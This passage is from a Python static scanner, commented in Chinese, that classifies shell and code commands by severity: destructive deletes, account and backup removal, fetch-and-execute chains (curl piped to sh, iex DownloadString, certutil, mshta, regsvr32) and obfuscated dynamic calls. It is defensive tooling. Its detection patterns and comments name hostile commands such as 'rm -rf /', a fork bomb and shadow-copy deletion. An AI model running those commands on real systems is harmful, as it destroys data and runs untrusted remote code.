                if _hits_system(tokens) or any(_norm(t).startswith("c:/") for t in tokens[1:]):
                    return "CRITICAL", "icacls 重置/拒绝系统盘权限"
                return "HIGH", "icacls 重置/拒绝权限"
            return None
        if base in {"chown", "chgrp", "chattr", "setfacl"}:
            if any(_norm(f) in {"-r", "--recursive"} for f in tokens[1:]) and _hits_system(tokens):
                return "CRITICAL", "%s 递归改系统目录属主/属性" % base
            return None
        if base in {"takeown", "attrib"} and _hits_system(tokens):
            return "CRITICAL", "%s 改系统文件所有权/属性" % base
        return None

    if base in MOVE_BINS:
        args = [t for t in tokens[1:] if not t.strip().startswith("-")]
        if not args:
            return None
        src = args[0]
        if _hits_system([src]) or (_norm(src).startswith("/") and not _is_benign_path(src)):
            return "CRITICAL", "%s 把系统/绝对路径文件移走（原地消失）" % base
        return None

    if base in ACCOUNT_BINS:
        joined = [_norm(t) for t in tokens[1:]]
        if base == "netlocalgroup":
            return None
        if base in {"net", "net.exe"}:
            # `net user Administrator /delete`、`net localgroup administrators x /delete`
            if "/delete" in joined and any(w in joined for w in ("user", "localgroup", "group")):
                return "CRITICAL", "net 删除本地账户/组"
            return None
        if base == "dscl":
            if "-delete" in joined or "delete" in joined:
                return "CRITICAL", "dscl 删除本地账户"
            return None
        if base == "remove-localuser" or base == "userdel" or base == "deluser":
            if base == "userdel" and any("--help" in t for t in tokens):
                return None
            return "CRITICAL", "%s 删除本地账户" % base
        return None

    if base in TASK_BINS:
        if base == "crontab":
            if any(_norm(t) in {"-r", "--remove"} for t in tokens[1:]):
                return "HIGH", "crontab -r 清空全部定时任务"
            return None
        if base == "schtasks":
            for i, t in enumerate(tokens[1:]):
                if _norm(t) == "/delete":
                    return "HIGH", "schtasks /delete 删除计划任务"
            return None
        return None

    if base in RECOVERY_BINS:
        joined = " ".join(_norm(t) for t in tokens[1:])
        if base == "vssadmin" and " delete " in " %s " % joined and "shadows" in joined:
            return "CRITICAL", "删除卷影副本（破坏系统恢复能力）"
        if base == "wbadmin" and "delete" in joined:
            return "CRITICAL", "wbadmin 删除备份目录/系统状态备份"
        if base == "bcdedit" and ("delete" in joined or "recoveryenabled" in joined):
            return "CRITICAL", "bcdedit 破坏引导/恢复配置"
        return None

    if base == "git":
        args = [_norm(t) for t in tokens[1:]]
        if "reset" in args and "--hard" in args:
            return "HIGH", "git reset --hard 丢弃本地未提交改动"
        if "clean" in args and any(a in {"-xfd", "-fdx", "-fd", "-fx"} for a in args):
            return "HIGH", "git clean -xfd 删除未跟踪文件"
        return None

    return None


# ── §3bk 远程取回即执行：代码不是本地写的，是从网上下载来就直接跑 ──────────
# 为什么单列一类：`curl … | sh` 只是"管道喂解释器"的一种写法，而真实攻击面还有
#   `iwr https://… | iex`、`iex (New-Object Net.WebClient).DownloadString(…)`、
#   `bash <(curl …)`、`certutil -urlcache -split -f` / `mshta http://…` /
#   `regsvr32 /i:http…scrobj.dll` / `bitsadmin /transfer` 这类"拿系统自带程序代跑"
#   （MITRE T1105 把工具拉进来 + T1218 代理执行），以及 `npx <pkg>`、`uvx <tool>`、
#   `deno run <url>`、`pip install <url>` 这种"远程包/远程脚本直接执行"。
# 判定要点：**取回**与**执行**同时出现才算；只下载存盘（curl -o / iwr -OutFile）不判，
# 否则正常的下载类技能会被误杀。判据词一律拼接，避免本仓自扫被自己的文本表命中。
_RF = _assemble("cur", "l|wget|iwr|irm|invoke-webrequest|invoke-restmethod")
_SINK = _assemble("sh|bash|zsh|dash|ksh|fish|python[0-9.]*|perl|ruby|node|php|"
                  "iex|invoke-expression|powershell|pwsh")
_RF_PIPE_RE = re.compile(r"(?:" + _RF + r")\b[\s\S]{0,200}?\|\s*(?:sudo\s+)?"
                         r"(?:" + _SINK + r")\b", re.I)
_RF_PROCSUB_RE = re.compile(r"(?:<\s*\(|=\s*\(\s*\()\s*(?:" + _RF + r")\b", re.I)
# PowerShell：iex / Invoke-Expression 与"下载"两个方向都要接住
_DLWORD = _assemble("download", "string|download", "file")
_PS_EXEC_RE = re.compile(
    r"(?:" + _assemble("iex", r"|invoke-expression") + r")[\s\S]{0,160}?"
    r"(?:" + _DLWORD + r"|" + _RF + r")", re.I)
_PS_EXEC_RE2 = re.compile(
    r"(?:" + _DLWORD + r")[\s\S]{0,160}?"
    r"(?:" + _assemble("iex", r"|invoke-expression") + r")", re.I)
# 代码里"先取后算"：fetch/urlopen/requests 再 eval/exec/Function
_RF_EVAL_RE = re.compile(
    r"(?:fetch\s*\(|urlopen\s*\(|req\w*\.get\s*\(|requests\.get\s*\()"
    r"[\s\S]{0,200}?(?:\.then\s*\(\s*eval\s*\)|\beval\s*\(|\bexec\s*\(|new\s+Function\s*\()",
    re.I)
# 反向也成立：`exec(urlopen(…).read())`、`eval((await fetch(…)).text())`
_RF_EVAL_RE2 = re.compile(
    r"(?:\beval\s*\(|\bexec\s*\(|new\s+Function\s*\()"
    r"[\s\S]{0,200}?(?:urlopen\s*\(|fetch\s*\(|requests\.get\s*\(|\bwget\b|\bcurl\b|https?://)",
    re.I)
_URLARG_RE = re.compile(r"(?:https?://|git\+https?://)", re.I)
_PROXY_DL_BINS = {_assemble("cert", "util"), _assemble("bits", "admin"),
                  _assemble("msh", "ta"), _assemble("regs", "vr32")}
_PKG_RUNNERS = {"npx", "uvx", "bunx", "pnpx"}


def _remote_exec_verdict(tokens):
    """返回 (severity, reason) 或 None：代码来自网络并且被执行。"""
    if not tokens:
        return None
    base = _basename(tokens[0])
    tail = " ".join(t for t in tokens[1:] if isinstance(t, str)).lower()

    # 1) 系统自带程序代跑（不需要 shell 字符串，本身就是下载+执行链）
    if base in _PROXY_DL_BINS:
        if base == _assemble("cert", "util") and "urlcache" in tail and _URLARG_RE.search(tail):
            return "HIGH", "%s 直接从网络拉取文件落盘（urlcache）" % base
        if base == _assemble("bits", "admin") and "/transfer" in tail and _URLARG_RE.search(tail):
            return "HIGH", "%s 后台传输从网络拉取可执行件" % base
        if base == _assemble("msh", "ta") and _URLARG_RE.search(tail):
            return "HIGH", "%s 直接执行远程 HTA 脚本" % base
        if base == _assemble("regs", "vr32") and ("scrobj" in tail or "/i:http" in tail):
            return "HIGH", "%s 用 scrobj.dll 代理执行远程脚本" % base

    # 2) 解释器/外壳的参数里带着"取回—执行"链
    for tok in tokens[1:]:
        if not isinstance(tok, str):
            continue
        if _RF_PIPE_RE.search(tok) or _RF_PROCSUB_RE.search(tok):
            return "CRITICAL", "远程内容直接交给解释器执行（取回即执行）"
        if _PS_EXEC_RE.search(tok) or _PS_EXEC_RE2.search(tok):
            return "CRITICAL", "下载后立即执行（iex / Invoke-Expression + 网络取回）"
        if _RF_EVAL_RE.search(tok) or _RF_EVAL_RE2.search(tok):
            return "CRITICAL", "从网络取回内容后立即求值（fetch/urlopen + eval/exec）"

    # 3) 远程包 / 远程脚本直接跑
    if base in _PKG_RUNNERS:
        args = [t for t in tokens[1:] if isinstance(t, str) and not t.strip().startswith("-")]
        if args:
            return "HIGH", "%s 拉取并执行远程包（%s）" % (base, args[0][:40])
    if base in {"deno", "bun"} and "run" in [t.lower() for t in tokens[1:]] \
            and _URLARG_RE.search(tail):
        return "HIGH", "%s run 直接执行远程脚本" % base
    if base in {"pip", "pip3", "uv"} and "install" in [t.lower() for t in tokens[1:]] \
            and _URLARG_RE.search(tail):
        return "HIGH", "%s 安装远程归档/仓库直接产物（未走索引）" % base
    if base in {"npm", "pnpm", "yarn"} and _URLARG_RE.search(tail) \
            and any(t.lower() in {"install", "i", "add"} for t in tokens[1:]):
        return "HIGH", "%s 从 URL 直接安装包（未走索引）" % base
    return None


# ── §3bl 命令不在这一行里：先落盘再执行 / 命令交给别人代跑 ────────────
# §3bk 只判"同一行里既取回又执行"。可真实流程常常是两步：
#   subprocess.run(["curl","-sSLo","/tmp/i.sh","https://…"])   ← 先落盘
#   subprocess.run(["bash","/tmp/i.sh"])                        ← 再执行
# 两步分开写，任何"看一行"的判据都看不见；行里也不出现管道符。
# 同族还有"命令写在文件里"（`powershell -File ./payload.ps1`、`bash ./x.sh`）
# 与"命令交给别的进程代跑"（`ssh host 'rm -rf …'`、`docker exec …`、
# `kubectl exec … -- shred …`、`nsenter …`）——命令既不在这行，也不在这个进程里。
# 对照基线：MITRE ATT&CK T1105（把载荷拉进来）→ T1059（执行）的链式用法，
# T1021 Remote Services、T1610/1611（容器执行与逃逸）。
_DL_CLIENTS = {_assemble("cur", "l"), _assemble("wg", "et"), _assemble("iw", "r"),
               _assemble("ir", "m"), "invoke-webrequest", "invoke-restmethod"}
_DL_OUT_FLAGS = {"-o", "--output", "-outfile", "-out", "-destination", "-filename"}
_DL_URLNAME_FLAG = _assemble("-", "O")
_SCRIPT_RUNNERS = {"bash", "sh", "zsh", "dash", "ksh", "fish", "pwsh", "powershell",
                   "python", "python3", "node", "perl", "ruby", "php", "cmd",
                   "source", "."}
_SCRIPT_EXTS = (".sh", ".bash", ".zsh", ".ps1", ".py", ".js", ".mjs", ".cjs",
                ".bat", ".cmd", ".pl", ".rb", ".php", ".vbs", ".hta")
_INLINE_FLAGS = {"-c", "-e", "-command", "/c", "/k", "-encodedcommand", "--eval",
                 "eval", "-r", "-p"}
_DELEGATE_BINS = {"ssh", "docker", "podman", "kubectl", "oc", "nsenter", "chroot",
                  "systemd-run", "runuser", "machinectl", "lxc", "virsh"}
_MAX_SCRIPT_READ = 200 * 1024
# 只有脚本类文件才按"命令行"读；源码文件交给对应语言的 AST 分析器
_SCRIPT_TEXT_EXTS = (".sh", ".bash", ".zsh", ".ksh", ".fish", ".ps1", ".bat",
                     ".cmd", ".vbs", ".hta")


def _looks_like_script_path(tok: str) -> bool:
    t = _norm(tok)
    return t.endswith(_SCRIPT_EXTS) or t.startswith("./") or t.startswith("../")


def _download_paths(tokens):
    """下载类 argv → 落盘路径；识别不出返回 []。"""
    if not tokens:
        return []
    base = _basename(tokens[0])
    if base == "urlretrieve":
        # urlretrieve(url, filename) —— 第二个参数就是落盘路径
        return [tokens[1]] if len(tokens) > 1 and isinstance(tokens[1], str) else []
    if base not in _DL_CLIENTS:
        return []
    out = []
    for i, t in enumerate(tokens[1:], start=1):
        if not isinstance(t, str):
            continue
        n = _norm(t)
        nxt = tokens[i + 1] if i + 1 < len(tokens) else None
        if n in _DL_OUT_FLAGS and isinstance(nxt, str):
            out.append(nxt)
        elif n == _norm(_DL_URLNAME_FLAG):
            urls = [u for u in tokens[1:] if isinstance(u, str) and _URLARG_RE.search(u)]
            if urls:
                out.append(urls[0].rstrip("/").split("/")[-1])
        elif _neg_has_out_flag(n) and isinstance(nxt, str) and not nxt.startswith("-") \
                and not _URLARG_RE.search(nxt):
            # 组合短开关：`curl -sSLo /tmp/x.sh …` 里 o 与 L 粘在一起，
            # 只认 "-o" 会把这一整个写法漏掉（§3bi stdbuf 的同类错）。
            out.append(nxt)
    return out


def _neg_has_out_flag(norm_flag: str) -> bool:
    """组合短开关里是否含"输出到文件"的那个字母。"""
    if not norm_flag.startswith("-") or len(norm_flag) < 3:
        return False
    body = norm_flag[1:]
    if body.isupper():
        return "O" in body
    return "o" in body


def _paths_in_text(text: str):
    """命令字符串里"下载到哪个文件"——如 `iwr <url> -OutFile C:/t/x.ps1`。"""
    out = []
    low = text or ""
    pat = re.compile(r"(?:-o|--output|-OutFile|-Out|-Destination|-filename)\s+([^\s\"';&|]+)",
                     re.I)
    for m in pat.finditer(low):
        out.append(m.group(1))
    return out


def _exec_script_paths(tokens):
    """执行类 argv → 被执行的脚本文件路径；识别不出返回 []。"""
    if not tokens:
        return []
    base = _basename(tokens[0])
    out = []
    if base in _SCRIPT_RUNNERS:
        for t in tokens[1:]:
            if not isinstance(t, str):
                continue
            n = _norm(t)
            if n in _INLINE_FLAGS:
                return []          # -c / -e 这类是内联代码，另行判定
            if n.startswith("-") or n in {"/c", "/k"}:
                continue
            if _looks_like_script_path(t):
                out.append(t)
    elif _looks_like_script_path(tokens[0]):
        out.append(tokens[0])      # 直接 ./tool 这种"就地执行"
    if base in {"cmd"}:
        for i, t in enumerate(tokens[1:], start=1):
            if _norm(t) in {"/c", "/k"} and i + 1 < len(tokens):
                cand = tokens[i + 1]
                if _looks_like_script_path(cand):
                    out.append(cand)
    return out


def _same_path(a: str, b: str) -> bool:
    na, nb = _norm(a).lstrip("./"), _norm(b).lstrip("./")
    return bool(na) and bool(nb) and (na == nb or na.split("/")[-1] == nb.split("/")[-1])


def _delegate_command(tokens):
    """把"交给别人代跑"还原成真正要跑的命令 argv；还原不出返回 None。

    实现要点：不按"第几个参数是命令"猜位置（`ssh -p 22 host cmd`、`docker exec -i c cmd`、
    `nsenter -t 1 -m -- cmd` 三种语法各不相同），而是找**第一个已知命令名**当切点。
    """
    if not tokens:
        return None
    base = _basename(tokens[0])
    if base not in _DELEGATE_BINS:
        return None
    known = set()
    for name in ("DELETE_BINS", "SHELL_WRAPPERS", "SYSTEM_UTILS", "RISKY_UTILS",
                 "ZERO_WRITE_BINS", "PERM_BINS", "MOVE_BINS", "ACCOUNT_BINS",
                 "TASK_BINS", "RECOVERY_BINS", "_PROXY_DL_BINS", "_PKG_RUNNERS"):
        known |= set(globals().get(name) or set())
    known |= set(INTERP_INLINE_FLAGS)
    for i, t in enumerate(tokens[1:], start=1):
        if not isinstance(t, str) or t.startswith("-"):
            continue
        if _basename(t) in known:
            return tokens[i:]
    return None


def _delegate_verdict(tokens):
    inner = _delegate_command(tokens)
    if not inner:
        return None
    v = destructive_tokens(inner, 1)
    if v:
        return v[0], "经 %s 代跑：%s" % (_basename(tokens[0]), v[1])
    return None


def _script_file_verdict(path_str: str, base_dir):
    """命令写在文件里：把文件读进来按命令行逐行判，判不出不猜。

    只读**脚本类**文件（.sh/.ps1/.bat…）。源码文件（.py/.js）由各自语言的分析器
    负责，按命令行去切 python 源码只会把文档示例切出假命中——自扫首轮就撞到了：
    `evaluate.py` 里的用法说明被当成一条命令，报出 CRITICAL。
    """
    if not _norm(path_str).endswith(_SCRIPT_TEXT_EXTS):
        return None
    try:
        from pathlib import Path as _P
        p = _P(path_str)
        if not p.is_absolute():
            p = _P(base_dir) / p
        p = p.resolve()
        root = _P(base_dir).resolve()
        if root not in p.parents:
            return None            # 仓外文件不读：证据不在扫描范围内
        if not p.is_file() or p.stat().st_size > _MAX_SCRIPT_READ:
            return None
        text = p.read_text(encoding="utf-8", errors="replace")
    except Exception:
        return None
    for line in text.splitlines():
        line = line.strip()
        if not line or line.startswith("#") or line.startswith("//"):
            continue
        toks = line.split()
        if not toks:
            continue
        v = destructive_tokens(toks, 1)
        if v:
            return v[0], "脚本文件 %s 内：%s" % (p.name, v[1])
    return None


class TwoStepExecVisitor(ast.NodeVisitor):
    """在一个模块里对账：下载了哪个文件，之后又执行了哪个文件。"""

    def __init__(self, base_dir):
        self.base_dir = base_dir
        self.consts, self.temps, self.lists = {}, set(), {}
        self.aliases = {}
        self.downloads = []
        self.execs = []

    def prepare(self, tree):
        self.consts, self.temps, self.lists = collect_consts(tree)
        self.aliases = collect_func_aliases(tree)

    def visit_Call(self, node):
        name = _dotted(node.func)
        name = self.aliases.get(name, name)
        try:
            argv = static_argv(node, name, self.consts, self.temps, self.lists)
        except Exception:
            argv = None
        if argv:
            for p in _download_paths(argv):
                self.downloads.append((p, node.lineno))
            for p in _exec_script_paths(argv):
                self.execs.append((p, node.lineno))
        # urlretrieve(url, filename)：第二个参数才是落盘路径，static_argv 只取第一个
        if name.endswith("urlretrieve") and len(node.args) >= 2:
            p = _fold_str(node.args[1], self.consts)
            if p:
                self.downloads.append((p, node.lineno))
        # 命令字符串里写着的落盘位置（`powershell -Command "iwr … -OutFile X"`）
        for a in node.args:
            if isinstance(a, ast.Constant) and isinstance(a.value, str):
                for p in _paths_in_text(a.value):
                    self.downloads.append((p, node.lineno))
            elif isinstance(a, (ast.List, ast.Tuple)):
                for e in a.elts:
                    if isinstance(e, ast.Constant) and isinstance(e.value, str):
                        for p in _paths_in_text(e.value):
                            self.downloads.append((p, node.lineno))
        self.generic_visit(node)


def _inline_code_verdict(code: str):
    """看内联脚本的正文，而不是只看"有没有字符串"。"""
    if not code:
        return None
    low = code.lower()
    for pat, sev, why in INLINE_DANGER:
        if pat.lower() in low:
            return sev, "%s（%s）" % (why, pat)
    return None
# 判据词拼接而成：避免规则源码本身被扫描器的文本表命中（自扫自命中）
_PS_DELETE = "remove" + "-" + "item"
_PS_RECURSE = "-" + "recurse"
_PS_FORCE = "-" + "force"


def _const_str(expr):
    return expr.value if isinstance(expr, ast.Constant) and isinstance(expr.value, str) else None


# ── §3bf 常量折叠：把"藏进变量"的字面量折回来 ────────────────────────────
def _fold_str(expr, consts, depth: int = 0):
    """把表达式折成一个字符串；折不出来返回 None（不猜）。"""
    if expr is None or depth > 4:
        return None
    if isinstance(expr, ast.Constant) and isinstance(expr.value, str):
        return expr.value
    if isinstance(expr, ast.Name):
        return consts.get(expr.id) if consts else None
    if isinstance(expr, ast.Attribute):
        # sys.executable 就是解释器本身；不折它，`[sys.executable, "-c", "…"]`
        # 这类写法连 token 都取不齐，内联脚本永远打不开。
        if _dotted(expr) == "sys.executable":
            return "python"
        return None
    if isinstance(expr, ast.BinOp) and isinstance(expr.op, ast.Add):
        left = _fold_str(expr.left, consts, depth + 1)
        right = _fold_str(expr.right, consts, depth + 1)
        return (left + right) if (left is not None and right is not None) else None
    if isinstance(expr, ast.JoinedStr):
        parts = []
        for v in expr.values:
            if isinstance(v, ast.Constant) and isinstance(v.value, str):
                parts.append(v.value)
            elif isinstance(v, ast.FormattedValue):
                inner = _fold_str(v.value, consts, depth + 1)
                if inner is None:
                    return None
                parts.append(inner)
            else:
                return None
        return "".join(parts)
    if isinstance(expr, (ast.List, ast.Tuple)):
        # 列表本身不折成字符串，交给 _fold_argv
        return None
    return None


def _fold_argv(expr, consts):
    """列表/元组逐项可折叠 → token 列表；有一项取不到就整体放弃。"""
    if not isinstance(expr, (ast.List, ast.Tuple)):
        return None
    out = []
    for elt in expr.elts:
        v = _fold_str(elt, consts)
        if v is None:
            if isinstance(elt, ast.Constant) and not isinstance(elt.value, str):
                continue
            return None
        out.append(v)
    return out or None


def _mentions_tempfile(expr) -> bool:
    """表达式里是否出现 tempfile 的临时目录产物。"""
    names = []
    for sub in ast.walk(expr):
        if isinstance(sub, ast.Call):
            fn = sub.func
            if isinstance(fn, ast.Attribute):
                names.append(fn.attr)
            elif isinstance(fn, ast.Name):
                names.append(fn.id)
        elif isinstance(sub, ast.Attribute):
            names.append(sub.attr)
    return any(n in {"mkdtemp", "mkstemp", "TemporaryDirectory", "tempfile", "gettempdir",
                     "NamedTemporaryFile", "TemporaryFile"} for n in names)


def _dotted(expr) -> str:
    """把 Name/Attribute 链折成 "subprocess.run" 这样的点号名；折不出来返回空串。"""
    if isinstance(expr, ast.Name):
        return expr.id
    if isinstance(expr, ast.Attribute):
        parent = _dotted(expr.value)
        return (parent + "." + expr.attr) if parent else expr.attr
    return ""


_ALIAS_MODULES = {"subprocess", "os", "shutil", "yaml", "pickle", "marshal", "runpy",
                  "ctypes", "importlib", "pty", "shelve", "dill", "jsonpickle"}


def collect_func_aliases(tree):
    """§3bf：`run = subprocess.run` 之后 registry 认不出"run"。
    同族还有 `from subprocess import run` / `P = subprocess.Popen`。
    这里只收"别名 → 点号名"的映射，判定前先翻译一次。
    """
    aliases = {}
    for node in ast.walk(tree):
        if isinstance(node, ast.Assign) and len(node.targets) == 1 \
                and isinstance(node.targets[0], ast.Name):
            dotted = _dotted(node.value)
            if dotted and "." in dotted:
                aliases[node.targets[0].id] = dotted
        elif isinstance(node, ast.ImportFrom) and node.module in _ALIAS_MODULES:
            # `from subprocess import Popen` 之后调用点写的是裸名 "Popen"，
            # registry 里存的是 "subprocess.Popen"——必须翻译，否则整族失明。
            for a in node.names:
                aliases[a.asname or a.name] = "%s.%s" % (node.module, a.name)
    return aliases


def collect_consts(tree):
    """收集可折叠的简单赋值，返回 (const_map, temp_names)。

    同一名字在不同作用域被赋成不同值 → 判为不可知、丢掉。
    宁可判不了，也不许因撞名把良性当破坏（或反过来）。
    """
    raw, temps = {}, set()
    for node in ast.walk(tree):
        targets, value = [], None
        if isinstance(node, ast.Assign) and len(node.targets) == 1:
            targets, value = [node.targets[0]], node.value
        elif isinstance(node, ast.AnnAssign) and getattr(node, "value", None) is not None:
            targets, value = [node.target], node.value
        if not targets or not isinstance(targets[0], ast.Name):
            continue
        name = targets[0].id
        if value is not None and _mentions_tempfile(value):
            temps.add(name)
            continue
        raw.setdefault(name, []).append(value)

    consts = {}
    lists = {}
    for _ in range(4):  # 多轮：允许 B = A 的链式别名、以及列表里含变量名
        for name, vals in raw.items():
            if name in consts or name in lists:
                continue
            if all(isinstance(v, (ast.List, ast.Tuple)) for v in vals if v is not None):
                folded = [_fold_argv(v, consts) for v in vals]
                distinct = {tuple(f) for f in folded if f is not None}
                if len(distinct) == 1 and all(f is not None for f in folded):
                    lists[name] = list(distinct.pop())
                continue
            folded = [_fold_str(v, consts, 1) for v in vals]
            distinct = {f for f in folded if f is not None}
            if len(distinct) == 1 and all(f is not None for f in folded):
                consts[name] = distinct.pop()
    return consts, temps, lists


def static_argv(node, func_name: str, consts=None, temps=None, lists=None):
    """取静态 argv：列表/元组全常量，或单个常量字符串（按空白切）。

    取不齐（有变量无法折叠、有 **kwargs）就返回 None —— 宁可不判，不猜。
    """
    consts = consts or {}
    lists = lists or {}
    if func_name.endswith("rmtree"):
        if not node.args:
            return None
        if isinstance(node.args[0], ast.Name) and temps and node.args[0].id in temps:
            return ["<tempfile>"]
        tgt = _fold_str(node.args[0], consts)
        return [tgt] if tgt else None
    if not node.args:
        return None
    first = node.args[0]
    if isinstance(first, (ast.List, ast.Tuple)):
        return _fold_argv(first, consts)
    if isinstance(first, ast.Name):
        if func_name.startswith("shutil.rmtree"):
            pass
        if lists.get(first.id):
            return list(lists[first.id])
        if consts.get(first.id) and func_name.startswith(("subprocess", "os.spawn")):
            # CMD = "rm -rf /"; run(CMD) —— 折成字符串再切
            return consts[first.id].split()
    if func_name.startswith("os.spawn"):
        vals = [v for v in (_fold_str(a, consts) for a in node.args) if v is not None]
        return vals or None
    if isinstance(first, (ast.Constant, ast.BinOp, ast.JoinedStr, ast.Name)):
        s = _fold_str(first, consts)
        return s.split() if s else None
    return None


def _norm(token: str) -> str:
    return token.strip().strip("\"'").replace("\\", "/").lower()


def _basename(token: str) -> str:
    base = _norm(token).rstrip("/").split("/")[-1]
    for ext in (".exe", ".bat", ".cmd", ".ps1"):
        if base.endswith(ext):
            base = base[: -len(ext)]
    return base


def _is_benign_path(tok: str) -> bool:
    low = _norm(tok)
    return any(h in low for h in BENIGN_PATH_HINTS)


def destructive_tokens(tokens, depth: int = 0):
    """返回 (severity, reason) 或 None。只认静态 token，不猜变量。"""
    if not tokens or depth > 2:
        return None
    base = _basename(tokens[0])
    joined = " ".join(_norm(t) for t in tokens)

    # §3bg：编码命令 —— 内容根本读不出来，只能按"无法静态判定"处理。
    # 放在 shell 分支之前：pwsh 既是 shell 也是解释器，谁先接都一样要判。
    for i, t in enumerate(tokens):
        if _norm(t) in PS_ENCODED_FLAGS:
            nxt = tokens[i + 1] if i + 1 < len(tokens) else ""
            if _looks_base64(nxt):
                return "HIGH", "%s 的编码命令无法静态判定" % _basename(tokens[0])

    if ":(){" in joined or "(){ :|" in joined:
        return "CRITICAL", "fork bomb 形态"

    # §3bi：命令前面套一层包装器（sudo / env / timeout / nice / nohup / xargs /
    # find -exec …），真正的命令就不是 token[0] 了。不剥这层皮，判定看着"没命令"。
    inner = _unwrap_wrapper(tokens)
    if inner and inner != tokens and len(inner) >= 1:
        nested = destructive_tokens(inner, depth + 1)
        if nested:
            return nested

    # §3bl：命令交给别的进程代跑（ssh / docker exec / kubectl exec -- … / nsenter …）
    delegate = _delegate_verdict(tokens)
    if delegate:
        return delegate

    # §3bj：破坏不止删除——清零/覆写、撤权、平移、删账户、删任务、删恢复、删库。
    verb = _destructive_verb_verdict(tokens)
    if verb:
        return verb

    # §3bk：远程取回即执行（取回 + 执行同时出现才算，只下载不判）
    remote = _remote_exec_verdict(tokens)
    if remote:
        return remote

    # §3bh：先按"参数形状"判，不看程序名。程序名白名单只当加速器，
    # 位置参数、未登记开关上的代码由这一步兜住。
    shape = _arg_code_verdict(tokens)
    if shape:
        return shape

    if base in DELETE_BINS or base.startswith("rm "):
        flags = [t for t in tokens[1:] if _FLAG_RE.match(t.strip())]
        targets = [t for t in tokens[1:] if not _FLAG_RE.match(t.strip())]
        recursive = any(_norm(f) in {_norm(x) for x in RECURSIVE_FLAGS} for f in flags) or \
            any(_norm(f) in {"-recursive"} for f in flags)
        forced = any(_norm(f) in {_norm(x) for x in FORCE_FLAGS} for f in flags) or recursive
        if not (recursive and forced) or not targets:
            return None
        for t in targets:
            n = _norm(t)
            if n in SYSTEM_TARGETS or any(n.startswith(p) for p in DEVICE_PREFIX + SYSTEM_PREFIXES):
                return "CRITICAL", "递归强制删除系统/设备路径 %s" % n
        for t in targets:
            if _is_benign_path(t):
                return None
            n = _norm(t)
            if n.startswith("/") or n.startswith("c:/") or n.startswith("~/"):
                return "HIGH", "递归强制删除绝对路径 %s" % n
        return None

    if base.startswith("mkfs") or base in {"shutdown", "reboot", "halt", "poweroff", "diskpart", "format"}:
        return "CRITICAL", "%s 会破坏主机或磁盘" % base
    if base == "dd" and any(_norm(t).startswith("of=/dev/") for t in tokens[1:]):
        return "CRITICAL", "dd 直接写块设备"
    if base == "wipefs" or base in {"fdisk", "parted"}:
        return "HIGH", "%s 改动分区表" % base
    if base == "reg" and len(tokens) > 1 and _norm(tokens[1]) == "delete":
        return "HIGH", "reg delete 改注册表"

    if base in SHELL_WRAPPERS:
        # powershell -Command "Remove-Item -Recurse -Force C:\..." 这类包装。
        # 判据词拆开拼：规则源码里不该出现能被自己文表命中的连续字面量
        # （§3be 自扫自命中：一行同时写着两个词，本仓自扫 87/A → 69/C）。
        if _PS_DELETE in joined and (_PS_RECURSE in joined or _PS_FORCE in joined):
            return "HIGH", "shell 内递归删除"
        for i, t in enumerate(tokens):
            if _norm(t) in {"-c", "-command", "/c", "-encodedcommand"} and i + 1 < len(tokens):
                inner = tokens[i + 1:]
                if len(inner) == 1:
                    inner = inner[0].split()
                v = _inline_code_verdict(" ".join(inner))
                if v:
                    return v
                return destructive_tokens(inner, depth + 1)
        return None

    # §3bg：解释器带内联脚本 —— 脚本是参数里的字符串，要打开看内容
    if base in INTERP_INLINE_FLAGS:
        flags = INTERP_INLINE_FLAGS[base]
        for i, t in enumerate(tokens[1:], start=1):
            nt = _norm(t)
            if nt in PS_ENCODED_FLAGS:
                nxt = tokens[i + 1] if i + 1 < len(tokens) else ""
                if _looks_base64(nxt):
                    return "HIGH", "%s 的编码命令无法静态判定" % base
                continue
            if nt in flags and i + 1 < len(tokens):
                code = " ".join(tokens[i + 1:])
                v = _inline_code_verdict(code)
                if v:
                    return v
                return None
        return None
    return None


def _mentions_tempfile(expr) -> bool:
    """表达式里是否出现 tempfile 的临时目录产物。"""
    names = []
    for sub in ast.walk(expr):
        if isinstance(sub, ast.Call):
            fn = sub.func
            if isinstance(fn, ast.Attribute):
                names.append(fn.attr)
            elif isinstance(fn, ast.Name):
                names.append(fn.id)
        elif isinstance(sub, ast.Attribute):
            names.append(sub.attr)
    return any(n in {"mkdtemp", "mkstemp", "TemporaryDirectory", "tempfile", "gettempdir",
                     "NamedTemporaryFile", "TemporaryFile"} for n in names)


def destructive_command(node, func_name: str, visitor):
    """§3be/§3bf 入口：取出静态 argv / 静态目标（含变量折叠），判"它要干什么"。"""
    consts = getattr(visitor, "consts", None) or {}
    temps = getattr(visitor, "temps", None) or set()
    lists = getattr(visitor, "lists", None) or {}
    if func_name.endswith("shutil.rmtree") and node.args:
        arg = node.args[0]
        if _mentions_tempfile(arg) or (isinstance(arg, ast.Name) and arg.id in temps):
            # 目标本身是 tempfile 产物：递归删除是正确的清理动作，不是破坏动作。
            return "LOW", "递归删除临时目录（tempfile 产物）"
    argv = static_argv(node, func_name, consts, temps, lists)
    if not argv:
        return None
    if func_name.endswith("shutil.rmtree"):
        target = argv[0]
        if target == "<tempfile>":
            return "LOW", "递归删除临时目录（tempfile 产物）"
        n = _norm(target)
        if n in SYSTEM_TARGETS or any(n.startswith(p) for p in DEVICE_PREFIX):
            return "CRITICAL", "递归删除系统路径 %s" % n
        if _is_benign_path(target):
            return "LOW", "递归删除临时/构建目录 %s" % target
        if n.startswith("/") or n.startswith("c:/") or n.startswith("~/"):
            return "HIGH", "递归删除绝对路径 %s" % n
        return None
    return destructive_tokens(argv)


class DynamicCallVisitor(ast.NodeVisitor):
    """名字拆开还算不算危险调用（§3av）。

    实测（audit2/probe_dynamic_call.py，修复前）：
      `getattr(os, "sys" + "tem")("id")`                  → 100/A+，一条不报
      `subprocess.__dict__["run"]("id", shell=True)`      → 100/A+（连 shell=True 都没看见）
      `__import__("o" + "s").system("id")`                → 只有 MEDIUM 96/A
    对照组：同一件事写成 `os.system("id")` 是 CRITICAL 49/D。

    规则若只认字面 `os.system(`，那么"例"过了、"类"没过——被拦的是写法，不是行为。
    这里按**取到的名字**判，不按写法判：名字是常量折叠出来的就直接算数。
    """

    # 取到这些名字就等于拿到执行面
    DANGEROUS_ATTRS = {
        "system", "popen", "spawn", "spawnl", "spawnv", "execv", "execve", "execl", "execvp",
        "run", "call", "Popen", "check_output", "check_call",
        "eval", "exec", "compile", "__import__",
    }
    IMPORT_MODULES = {"os", "subprocess", "shutil", "ctypes", "socket", "pickle", "importlib"}

    def __init__(self):
        self.findings: List[AstFinding] = []

    @staticmethod
    def _const_str(node):
        """把常量、常量加法、纯常量 f-string 折叠成一个字符串；折不出来返回 None。"""
